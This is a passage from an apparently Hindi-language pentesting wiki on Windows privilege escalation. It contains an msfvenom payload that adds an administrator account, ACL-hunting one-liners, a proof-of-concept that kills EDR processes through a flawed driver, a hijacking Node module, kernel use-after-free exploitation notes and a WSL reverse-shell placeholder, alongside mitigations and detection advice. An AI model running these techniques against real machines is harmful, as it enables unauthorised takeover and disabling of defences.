		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**आप इस vulnerability का पता लगा सकते हैं और इसका exploit कर सकते हैं** metasploit से: `exploit/windows/local/trusted\_service\_path` आप metasploit से manually service binary बना सकते हैं:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Recovery Actions

Windows उपयोगकर्ताओं को यह निर्दिष्ट करने देता है कि कोई service विफल होने पर कौन-सी कार्रवाइयाँ की जाएँ। इस सुविधा को किसी binary की ओर इंगित करने के लिए configure किया जा सकता है। यदि इस binary को बदला जा सकता है, तो privilege escalation संभव हो सकता है। अधिक जानकारी [आधिकारिक दस्तावेज़](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) में मिल सकती है।

## Scheduled task script targets

ऐसे enabled task के लिए जो `.bat` या `.cmd` file के साथ `cmd.exe /c` चलाता है, **action arguments** में दिए गए script के साथ-साथ `cmd.exe` की भी जाँच करें। यही बात interpreter के स्पष्ट file argument, जैसे PowerShell `-File`, पर भी लागू होती है। यदि किसी scheduled batch file में literal PowerShell `-File` call है, तो उस संदर्भित script के ACL की भी जाँच करें; variables, conditionals और shell chaining को manually trace करना होगा। Caller द्वारा लिखी जा सकने वाली script या parent directory, cross-account execution का संकेत तभी है जब configured task principal, caller से अलग हो और task वास्तव में उस action तक पहुँचे। Scripts के लिए append-only ACL मायने रख सकता है, लेकिन पहले का `exit` या अन्य control flow जोड़ी गई lines को unreachable बना सकता है। Escalation का दावा करने से पहले effective ACLs, [task execution context](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), working directory, trigger और application-control policy की पुष्टि करें। Inventory के दौरान script में बदलाव न करें और task शुरू न करें।

## Accessible files पर named streams

NTFS पर किसी readable file में `:$DATA` नाम वाला stream हो सकता है, जिसकी सामग्री सामान्य directory listing में नहीं दिखती। सीमित और प्रासंगिक accessible backups या configuration files के लिए, कोई भी सामग्री खोलने से पहले stream के **नाम और आकार** देखें; Windows इन्हें [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) और PowerShell के [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) के ज़रिए उपलब्ध कराता है। Secret का संकेत देने वाला stream name केवल एक सुराग है। File की effective read access, filesystem द्वारा stream support, stream में उपयोगी credentials होने और वे credentials वास्तव में किस account से authenticate करते हैं—इन सबकी जाँच करें। नियमित enumeration के दौरान recursive stream scans करने और stream की सामग्री प्रिंट करने से बचें।

## Scheduled Windows Driver Kit helper inputs

Optional Windows Driver Kit में `StandaloneRunner.exe` शामिल है, जो अपनी run directory से `command.txt`, `reboot.rsf` और project की `working\rsf.rsf` file का उपयोग कर सकता है। यदि कोई scheduled task या service इस helper को privileged account से शुरू करती है, तो इन inputs पर low-privilege write access उस account के context में command execution का अवसर दे सकती है, भले ही helper executable स्वयं protected हो। पुष्टि करें कि privileged consumer मौजूद है और **दोनों** sidecar files बनाई या संशोधित की जा सकती हैं; केवल helper मिलना पर्याप्त नहीं है।

Scheduled task के लिए, उसके action की [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) और दोनों sidecar paths के ACL की जाँच करें। यदि task working directory निर्दिष्ट नहीं करता, तो executable की directory केवल एक ऐसा सुराग है जिसकी पुष्टि करनी होगी—यह इस बात का प्रमाण नहीं कि task अपने inputs कहाँ से पढ़ता है। Project की working-file की prerequisite भी पूरी होनी चाहिए। यह मानने के बजाय कि task SYSTEM के रूप में चलता है, वास्तविक task principal की जाँच करें।

## Applications

### Installed Applications

**Binaries की permissions** जाँचें (शायद आप किसी को overwrite करके privilege escalation कर सकते हैं) और **folders** की भी ([DLL Hijacking](dll-hijacking/index.html))।

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent repair path

[CVE-2024-0670](https://checkmk.com/werk/16361) पुराने Checkmk Windows agents को प्रभावित करता है, जो `C:\Windows\Temp` में command files लिखते थे और replacement विफल होने पर पहले से मौजूद write-protected file को execute कर देते थे। Vendor ने इस समस्या को 2.1.0p40, 2.2.0p23, 2.3.0b1 और 2.4.0b1 में ठीक किया। Installed patch level का पूरा विवरण और यह जाँचें कि प्रभावित agent operation चल सकता है या नहीं; केवल branch label, जैसे `2.1`, से exposure की पुष्टि नहीं होती। Enumeration में version, service state और Temp permissions की जाँच बिना files बनाए या agent commands trigger किए की जा सकती है।

#### ADSelfService Plus SAML service review

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) ने ADSelfService Plus build 6210 और उससे पुराने builds को प्रभावित किया; vendor ने इसे build 6211 में ठीक किया। यह तभी प्रासंगिक है, जब SAML SSO **enabled हो या पहले enabled रहा हो**। इसलिए installed-product entry या service path केवल एक सुराग है, vulnerability का निष्कर्ष नहीं: सटीक build, SAML configuration history, service की network reachability और यह पुष्टि करें कि यह किस account के तहत चलता है। Service के ज़रिए code execution को उसी account के privileges मिलते हैं; SYSTEM execution के लिए instance का SYSTEM के तहत चलना ज़रूरी है। Product के Backup directory में पढ़ी जा सकने वाली `OfflineBackup_*.ezip` एक अलग encrypted backup का सुराग है, usable credential या इस SAML flaw का प्रमाण नहीं। Routine enumeration के दौरान इसे unpack किए बिना इसका path और access rights दर्ज करें।

#### Jenkins controller और domain-account boundaries

Windows Jenkins controller पर किसी job को create या configure करने की permission और उसे start करने की permission में अंतर करें: [Jenkins इन्हें अलग `Job/Create`, `Job/Configure` और `Job/Build` rights के रूप में दर्ज करता है](https://www.jenkins.io/doc/book/security/access-control/permissions/). Configured schedule या remote trigger से build चलाने का एक और रास्ता मिल सकता है, लेकिन पुष्टि करें कि वह enabled है और build वास्तव में चलता है। Execution को controller या चुने गए agent की identity मिलती है, और stored credential का उपयोग तभी हो सकता है जब job उसके scope तक पहुँच सके। इसके अलावा, `JENKINS_HOME` metadata तक पहुँच की जाँच करें: Jenkins credential material और encryption keys को `credentials.xml`, `secrets/hudson.util.Secret` और `secrets/master.key` में रखता है ([Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)). केवल इनका मौजूद होना password उजागर नहीं करता; shared output में secrets दिखाए बिना **ज़रूरी files तक read access** और account reuse का एक अलग रास्ता सत्यापित करें। यदि उस account के पास AD user-object `scriptPath` write right है, तो इसे cross-user execution मानने से पहले writable script path और target user के रूप में चलने वाला वास्तविक logon या scheduled consumer सत्यापित करें। आगे के group control के लिए प्रभावी AD rights अलग से सत्यापित करना ज़रूरी है।

#### Azure Pipelines self-hosted agent identity

Azure DevOps Server या Azure Pipelines project के लिए pipeline **बनाने या edit करने** की permission को उसे **queue** करने और चुने गए agent pool का उपयोग करने की permission से अलग रखें; [Microsoft pipeline permissions](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) और [pool authorization](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) को अलग-अलग दर्ज करता है। यदि कम privileges वाला account script step submit कर सकता है और उस pipeline को self-hosted Windows agent पर चला सकता है, तो step [agent के configured operating-system account](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) के रूप में execute होता है। Cross-user या SYSTEM transition का दावा करने से पहले सटीक pipeline, branch/resource restrictions, authorized pool, runnable job और agent service identity सत्यापित करें। Installed agent, project role या repository write permission अपने आप में केवल एक सुराग है; passive enumeration के दौरान build शुरू किए बिना permissions और local service metadata की जाँच करें।

#### Microsoft Entra Connect Sync credentials

[Microsoft अंतर स्पष्ट करता है](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions): **ADSync service account** synchronization service चलाता है और अपने SQL database तक पहुँचता है, जबकि **AD DS connector account** की directory permissions configured sync features पर निर्भर करती हैं। Connector credentials उस database में encrypted रूप से store होते हैं और key material [ADSync service account के तहत DPAPI द्वारा सुरक्षित होता है](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account)। Installed sync service, local administrator जैसा दिखने वाला group या database की visibility अकेले decrypt किए जा सकने वाले credential या domain escalation को साबित नहीं करती। Database के वास्तविक read rights, service-account/key access, installation और SQL layout, configured connector identity और उस identity के प्रभावी AD privileges की अलग-अलग जाँच करें। Routine enumeration में केवल service और access metadata दिखाएँ, stored secrets को query या print न करें।

#### Printer driver support DLL permissions

Installed printer driver अपनी support DLLs को `C:\ProgramData` के तहत रख सकता है और उन्हें अधिक privileged print process में load कर सकता है। Printer WMI enumeration अस्वीकृत होने पर भी exact driver directory और DLL ACLs की जाँच करें; इसमें parent directories और reparse points भी शामिल हैं। [Ricoh printer-driver issue CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) के लिए रिपोर्ट किया गया path `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` था; [मूल disclosure](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) में `PrintIsolationHost.exe` द्वारा DLL loading का वर्णन है। Writable ACL केवल एक सुराग है: deny entries के बाद प्रभावी write access, संबंधित driver के installed होने और privileged identity के तहत file load करने, तथा vendor के updated driver या security program द्वारा installation ठीक किए जाने की पुष्टि करें। केवल directory name या driver version के आधार पर vulnerability का निष्कर्ष न निकालें।

### Write permissions

जाँचें कि क्या आप किसी config file को modify करके कोई विशेष file पढ़ सकते हैं, या किसी ऐसे binary को modify कर सकते हैं जिसे Administrator account (schedtasks) execute करेगा।

System में कमज़ोर folder/file permissions खोजने का एक तरीका यह है:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ अपने `plugins` subfolders में मौजूद किसी भी plugin DLL को autoload करता है। अगर कोई writable portable/copy install मौजूद है, तो उसमें malicious plugin डालने से हर launch पर `notepad++.exe` के अंदर automatic code execution होता है (जिसमें `DllMain` और plugin callbacks भी शामिल हैं)।

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### स्टार्टअप पर चलना

**जाँचें कि क्या आप किसी ऐसी registry या binary को overwrite कर सकते हैं, जिसे कोई दूसरा user execute करेगा।**\
**यह जानने के लिए कि privileges escalate करने के लिए कौन-सी autoruns locations उपयोगी हैं,** **यह पेज पढ़ें**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

संभावित **third-party अजीब/कमज़ोर** drivers खोजें

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

यदि कोई driver arbitrary kernel read/write primitive उजागर करता है (जो खराब तरीके से डिज़ाइन किए गए IOCTL handlers में आम है), तो आप kernel memory से सीधे SYSTEM token चुराकर privilege escalate कर सकते हैं।<sup>[[13]](#references)</sup> Step-by-step technique यहाँ देखें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Race-condition bugs के मामले में, जहाँ vulnerable call attacker-controlled Object Manager path खोलता है, lookup को जानबूझकर धीमा करने (max-length components या deep directory chains का उपयोग करके) से window को microseconds से बढ़ाकर tens of microseconds तक किया जा सकता है:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAFs, paged-pool disclosures, और I/O ring pivots

कुछ Windows kernel LPE chains दो अलग-अलग कमजोर bugs से बनाई जा सकती हैं: एक **cancel-safe queue lifetime race**, जो queue lock के held रहते किसी request/CBD को free कर देती है, और एक **lock-release-before-copy** disclosure, जो `RtlCopyToUser` के दौरान freed paged-pool allocation को leak करती है।<sup>[[29]](#references)</sup>

Audit और exploitation notes:

- **Free-under-lock + cancel afterwards**: ऐसा success path ढूँढें जो **Acquire -> CompleteRequest/free -> Release** करता हो, जबकि cancel path **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** करता हो। यदि success path, CBDQ/CSQ lock release करने से पहले `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` तक पहुँचता है, तो `NtCancelIoFileEx -> IopCsqCancelRoutine` में blocked thread बाद में resume होकर freed `PFLT_CALLBACK_DATA` को driver के remove callback में पास कर सकता है।
- **Freed queue object को reclaim करें** किसी समान आकार के attacker-controlled paged-pool allocation से। `NPFS` Data Queue Entries उपयोगी हैं, क्योंकि उनका payload और size नियंत्रित किया जा सकता है और बाद में pipe read/peek operations से उन्हें probe किया जा सकता है। यदि freed object में list links हों, तो उन्हें user memory में **fake request nodes की cyclic list** से overwrite करें, ताकि driver मूल list head पर रुकने के बजाय attacker-defined request structures को बार-बार process करे।
- **Predictable write को upgrade करें**: यदि fake request bookkeeping writes (timestamps / QPC / refcount-adjacent fields) द्वारा उपयोग किए जाने वाले nested context pointer को redirect करता है, तो आपको **address-controlled but not value-controlled** kernel write मिल सकती है। इस स्थिति में, किसी final code/data pointer के बजाय sprayed pool object के **length/size** field को target करें, फिर spray को enumerate करें, जब तक corrupted object से **out-of-bounds paged-pool read** न मिल जाए।
- **Raceable disclosure pattern**: कोई भी syscall जो `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` करता हो, एक मजबूत candidate है। Reliability तब बेहतर होती है जब attacker copied buffer को बड़ा कर सकता हो (उदाहरण के लिए, कई list/resource entries जोड़कर, जिससे serializer का final allocation size बढ़े), क्योंकि लंबी copy replacement window को चौड़ा करती है और ज़रूरी नहीं कि machine crash हो।
- **Pointer-rich refill targets**: Windows **I/O ring** registered-buffer arrays बेहतरीन disclosure targets हैं, क्योंकि उनका paged-pool size attacker-controlled होता है (`8 * regBufferCnt`) और हर element एक `_IOP_MC_BUFFER_ENTRY` का kernel pointer होता है। इनमें से किसी एक array को leak करें, आसपास का `IORING_OBJECT` recover करें, फिर **`RegBuffers`** और **`RegBuffersCount`** corrupt करें, ताकि बाद के I/O ring operations attacker-forged entries का उपयोग करें और arbitrary kernel read/write दें। यदि उपलब्ध एकमात्र write आपको एक stable byte देता है (उदाहरण के लिए `KUSER_SHARED_DATA+0x14` से), तो **overlapping unaligned writes** का उपयोग करके `0x0101010101010101` जैसा repeated-byte user pointer बनाएँ, उसे `VirtualAlloc` से map करें, और वहाँ forged registered-buffer array रखें।<sup>[[30]](#references)</sup>

काम के debugging indicators:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

corrupted I/O ring से arbitrary kernel read/write हासिल करने के बाद, standard post-primitive workflow का उपयोग करके SYSTEM token चुरा लें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

आधुनिक hive vulnerabilities आपको deterministic layouts तैयार करने, writable HKLM/HKU descendants का दुरुपयोग करने और custom driver के बिना metadata corruption को kernel paged-pool overflows में बदलने देती हैं। पूरी chain यहाँ जानें:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` में attacker-controlled paths से direct-mode type confusion

कुछ drivers userland से registry path स्वीकार करते हैं, केवल यह जाँचते हैं कि वह एक मान्य UTF-16 string है, और फिर stack scalar, जैसे `int readValue`, में `RTL_QUERY_REGISTRY_DIRECT` के साथ `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` कॉल करते हैं। यदि `RTL_QUERY_REGISTRY_TYPECHECK` मौजूद न हो, तो `EntryContext` की व्याख्या developer की अपेक्षित type के बजाय **वास्तविक** registry type के अनुसार की जाती है।

इससे दो उपयोगी primitives बनते हैं:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: user-controlled absolute `\Registry\...` path से driver को attacker द्वारा चुनी गई keys query करने के लिए कहा जा सकता है, return codes/logs के ज़रिए उनके अस्तित्व का पता लगाया जा सकता है, और कभी-कभी ऐसी values पढ़ी जा सकती हैं जिन तक caller की सीधी पहुँच नहीं होती।
- **Kernel memory corruption**: `&readValue` जैसा scalar destination registry value type के आधार पर `REG_QWORD`, `UNICODE_STRING` या आकार वाले binary buffer के रूप में type-confused हो सकता है।

व्यावहारिक exploitation नोट्स:

- **Windows 8+ mitigation**: यदि query `RTL_QUERY_REGISTRY_DIRECT` के साथ किसी **untrusted hive** को hit करती है, लेकिन उसमें `RTL_QUERY_REGISTRY_TYPECHECK` नहीं है, तो kernel callers `KERNEL_SECURITY_CHECK_FAILURE (0x139)` के साथ crash हो जाते हैं। Exploitability बनाए रखने के लिए, `HKCU` के अंतर्गत values रखने के बजाय **trusted system hives के अंदर attacker-writable keys** खोजें।
- **Trusted-hive staging**: `\Registry\Machine` के writable descendants की सूची बनाने के लिए NtObjectManager का उपयोग करें, फिर sandboxed contexts से पहुँच योग्य keys ढूँढ़ने के लिए duplicated **low-integrity** token के साथ scan दोबारा चलाएँ:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4-byte `int` में 8-byte का direct write करने से पास का stack data corrupt हो जाता है और पास के callback/function pointer को आंशिक रूप से overwrite किया जा सकता है।
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode में `EntryContext` का `UNICODE_STRING` की ओर point करना अपेक्षित है। अगर code पहले attacker-controlled `REG_DWORD` को stack scalar में load करता है और फिर उसी buffer को string read के लिए दोबारा इस्तेमाल करता है, तो attacker `Length`/`MaximumLength` को नियंत्रित कर सकता है और `Buffer` pointer को आंशिक रूप से प्रभावित कर सकता है, जिससे kernel में semi-controlled write होता है।
- **`REG_BINARY`**: बड़े binary data के लिए, direct mode `EntryContext` पर पहले `LONG` को signed buffer size मानता है। अगर पहले की `REG_DWORD` read, दोबारा इस्तेमाल किए गए scalar में attacker-controlled **negative** value छोड़ देती है, तो अगली `REG_BINARY` query attacker के bytes को सीधे पास के stack slots पर copy कर देती है। यह अक्सर callback-pointer को पूरी तरह overwrite करने का सबसे साफ़ तरीका होता है।

मज़बूत hunting pattern: **एक ही stack variable में heterogeneous registry reads, बिना उसे फिर से initialize किए**। `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, दोबारा इस्तेमाल किए गए `EntryContext` pointers, और उन code paths को grep करें जहाँ पहली registry read तय करती है कि दूसरी read होगी या नहीं।

#### Device objects पर FILE_DEVICE_SECURE_OPEN सेट न होने का दुरुपयोग (LPE + EDR kill)

कुछ signed third-party drivers, IoCreateDeviceSecure के ज़रिए मज़बूत SDDL के साथ अपना device object बनाते हैं, लेकिन `DeviceCharacteristics` में `FILE_DEVICE_SECURE_OPEN` सेट करना भूल जाते हैं। इस flag के बिना, जब device को ऐसे path के ज़रिए खोला जाता है जिसमें एक अतिरिक्त component हो, तो secure DACL लागू नहीं होता। इससे कोई भी unprivileged user इस तरह का namespace path इस्तेमाल करके handle प्राप्त कर सकता है:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (एक वास्तविक मामले में)

जब user device खोल सकता है, तो driver के ज़रिए उपलब्ध privileged IOCTLs का दुरुपयोग करके LPE और tampering किया जा सकता है। वास्तविक मामलों में देखी गई क्षमताओं के उदाहरण:
- मनमाने processes के full-access handles लौटाना (token theft / DuplicateTokenEx/CreateProcessAsUser के ज़रिए SYSTEM shell)।
- बिना किसी रोक-टोक के raw disk read/write (offline tampering, boot-time persistence tricks)।
- मनमाने processes को terminate करना, जिसमें Protected Process/Light (PP/PPL) भी शामिल हैं। इससे kernel के ज़रिए user land से AV/EDR kill किया जा सकता है।

न्यूनतम PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Developers के लिए Mitigations
- DACL द्वारा प्रतिबंधित किए जाने वाले device objects बनाते समय हमेशा FILE_DEVICE_SECURE_OPEN सेट करें।
- Privileged operations के लिए caller context validate करें। Process termination या handle returns की अनुमति देने से पहले PP/PPL checks जोड़ें।
- IOCTLs को सीमित करें (access masks, METHOD_*, input validation) और direct kernel privileges के बजाय brokered models पर विचार करें।

Defenders के लिए Detection ideas
- संदिग्ध device names (जैसे, \\ .\\amsdk*) को user-mode से खोलने और abuse के संकेत देने वाले विशिष्ट IOCTL sequences पर निगरानी रखें।
- Microsoft की vulnerable driver blocklist (HVCI/WDAC/Smart App Control) लागू करें और अपनी allow/deny lists बनाए रखें।


## PATH DLL Hijacking

अगर आपके पास **PATH में मौजूद किसी folder के अंदर write permissions** हैं, तो आप किसी process द्वारा load की गई DLL को hijack करके **privileges escalate** कर सकते हैं।<sup>[[2]](#references)</sup>

PATH के अंदर मौजूद सभी folders की permissions जाँचें:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

इस check का दुरुपयोग करने के बारे में अधिक जानकारी के लिए:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` के ज़रिए Node.js / Electron module resolution hijacking

यह **Windows uncontrolled search path** का एक variant है, जो **Node.js** और **Electron** applications को तब प्रभावित करता है जब वे `require("foo")` जैसा bare import करते हैं और अपेक्षित module **मौजूद नहीं होता**।<sup>[[20]](#references)</sup>

Node packages को resolve करने के लिए directory tree में ऊपर की ओर जाता है और हर parent में `node_modules` folders जाँचता है। Windows पर यह खोज drive root तक पहुँच सकती है, इसलिए `C:\Users\Administrator\project\app.js` से launch किया गया application संभवतः इन paths को जाँच सकता है:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

अगर कोई **low-privileged user** `C:\node_modules` बना सकता है, तो वह एक malicious `foo.js` (या package folder) रख सकता है और किसी **higher-privileged Node/Electron process** द्वारा missing dependency को resolve करने की प्रतीक्षा कर सकता है। Payload victim process के security context में execute होता है, इसलिए जब भी target administrator के रूप में, elevated scheduled task/service wrapper से, या auto-started privileged desktop app के रूप में चलता है, यह **LPE** बन जाता है।

ऐसा विशेष रूप से इन स्थितियों में आम है:

- कोई dependency `optionalDependencies` में घोषित हो<sup>[[22]](#references)</sup>
- कोई third-party library `require("foo")` को `try/catch` में रखती हो और failure के बाद भी आगे चलती हो
- कोई package production builds से हटाया गया हो, packaging के दौरान शामिल न किया गया हो, या install होने में विफल रहा हो
- vulnerable `require()` main application code के बजाय dependency tree में गहराई में हो

### Vulnerable targets की खोज

Resolution path को साबित करने के लिए **Procmon** का उपयोग करें:<sup>[[23]](#references)</sup>

- `Process Name` को target executable (`node.exe`, Electron app EXE, या wrapper process) पर filter करें
- `Path` को `node_modules` `contains` पर filter करें
- `NAME NOT FOUND` और `C:\node_modules` के अंतर्गत अंतिम successful open पर ध्यान दें

Unpacked `.asar` files या application sources में code review के लिए उपयोगी patterns:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon या source review से **missing package name** पहचानें।
2. यदि root lookup directory पहले से मौजूद नहीं है, तो उसे बनाएँ:

```powershell
mkdir C:\node_modules
```

3. अपेक्षित सटीक नाम वाला एक module डालें:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. victim application को trigger करें। यदि application `require("foo")` का प्रयास करता है और legitimate module मौजूद नहीं है, तो Node `C:\node_modules\foo.js` load कर सकता है।

इस pattern में फिट होने वाले missing optional modules के real-world उदाहरणों में `bluebird` और `utf-8-validate` शामिल हैं, लेकिन reusable हिस्सा **technique** है: ऐसा कोई भी **missing bare import** ढूँढ़ें जिसे privileged Windows Node/Electron process resolve करेगा।

### Detection और hardening के सुझाव

- जब कोई user `C:\node_modules` बनाए या वहाँ नई `.js` files/packages लिखे, तो alert करें।
- `C:\node_modules\*` से पढ़ने वाले high-integrity processes की तलाश करें।
- Production में सभी runtime dependencies को package करें और `optionalDependencies` के उपयोग का audit करें।
- Third-party code में `try { require("...") } catch {}` जैसे silent patterns की समीक्षा करें।
- यदि library इसका समर्थन करती है, तो optional probes disable करें (उदाहरण के लिए, कुछ `ws` deployments `WS_NO_UTF_8_VALIDATE=1` के साथ legacy `utf-8-validate` probe से बच सकते हैं)।

## नेटवर्क

### शेयर्स

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts file

hosts file में hardcode किए गए अन्य ज्ञात कंप्यूटरों की जाँच करें.

```
type C:\Windows\System32\drivers\etc\hosts
```

### नेटवर्क इंटरफ़ेस और DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### खुले पोर्ट

बाहर से **प्रतिबंधित सेवाओं** की जाँच करें

```bash
netstat -ano #Opened ports?
```

लोकल listener के लिए, उसके PID को process owner, executable path, और उसे शुरू करने वाली किसी service या scheduled task से correlate करें। Remote-control service अपने desktop user के रूप में access तभी दे सकती है, जब उसके authentication और command controls इसकी अनुमति दें। किसी higher-privileged account के रूप में चलने वाला custom TCP application एक अलग review target है: listener और binary path passive leads हैं, जबकि authenticated memory-corruption route के लिए उसी binary और उसके reachable input का analysis आवश्यक है। अगर कोई exposed port किसी system process का लगता है, तो backend service का attribution करने से पहले उसकी तुलना [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) से करें; केवल forwarding rule होने से यह साबित नहीं होता कि destination reachable या vulnerable है।

### Routing Table

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP तालिका

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### फ़ायरवॉल नियम

[**फ़ायरवॉल से संबंधित कमांड के लिए यह पेज देखें**](../basic-cmd-for-pentesters.md#firewall) **(नियमों की सूची देखें, नियम बनाएँ, बंद करें, बंद करें...)**

[नेटवर्क enumeration के लिए और कमांड यहाँ](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` को `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में भी पाया जा सकता है।

यदि आपको root user मिल जाता है, तो आप किसी भी port पर listen कर सकते हैं (पहली बार जब आप किसी port पर listen करने के लिए `nc.exe` का इस्तेमाल करेंगे, तो GUI के ज़रिए पूछा जाएगा कि क्या firewall द्वारा `nc` को अनुमति दी जानी चाहिए)।

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

आसानी से `bash` को root के रूप में शुरू करने के लिए, आप `--default-user root` आज़मा सकते हैं।

आप `WSL` फ़ाइल सिस्टम को `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` फ़ोल्डर में देख सकते हैं।

